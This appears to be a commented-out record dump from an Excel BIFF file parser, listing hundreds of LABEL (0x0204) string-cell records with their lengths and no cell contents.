' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
